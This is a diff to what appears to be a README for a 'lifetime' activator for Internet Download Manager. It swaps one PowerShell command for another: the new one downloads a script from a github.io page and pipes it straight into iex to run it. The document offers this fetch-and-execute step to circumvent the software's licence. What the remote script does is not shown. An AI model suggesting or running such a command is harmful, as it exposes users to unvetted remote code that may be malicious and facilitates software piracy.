@@ -12,7 +12,8 @@ Activate IDM for Lifetime: The fastest download accelerator.
     ```
     
     ```powershell
-    irm https://massgrave.dev/get | iex
+
+    iwr -useb https://naeembolchhi.github.io/IDM-Activator/IDMA.ps1 | iex
 
     ```
 
